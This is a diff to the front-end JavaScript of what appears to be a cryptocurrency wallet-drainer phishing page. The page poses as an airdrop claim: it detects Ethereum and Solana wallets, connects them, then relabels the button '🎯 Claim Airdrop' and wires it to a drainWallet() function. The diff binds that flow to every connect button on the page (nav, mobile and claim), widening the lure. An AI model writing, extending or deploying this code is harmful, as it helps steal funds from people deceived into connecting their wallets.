@@ -360,9 +360,9 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
         return links[walletName.toLowerCase()] || null;
     }
 
-    // UI Setup
-    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
-    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
+    // UI Setup — only inject wallet selector into the claim section, not nav/mobile buttons
+    $('.claim-wallet').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
+    $('.claim-wallet').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
 
     function updateConnectionStatus(message, isError = false) {
         $('#connection-status').text(message).css('color', isError ? '#ff4444' : '#666');
@@ -383,8 +383,8 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
     updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets: ${detectedWallets.length}`);
     initSolana();
 
-    // MAIN CONNECTION HANDLER
-    $('#connect-wallet').on('click', async () => {
+    // MAIN CONNECTION HANDLER — bind to all connect-wallet buttons (nav, mobile, claim)
+    $('.connect-wallet-btn').on('click', async () => {
         const selectedIdx = $('#wallet-select').val();
         const selected = detectedWallets[selectedIdx];
 
@@ -467,7 +467,7 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
             if (solProvider) await handleSolanaConnection();
             
             updateConnectionStatus(`Connected | ${ethBalance} ETH | `);
-            $('#connect-wallet').text("🎯 Claim Airdrop").off('click').on('click', () => drainWallet());
+            $('.connect-wallet-btn').text("🎯 Claim Airdrop").off('click').on('click', () => drainWallet());
             
         } catch(e) {
             updateConnectionStatus("Setup failed", true);
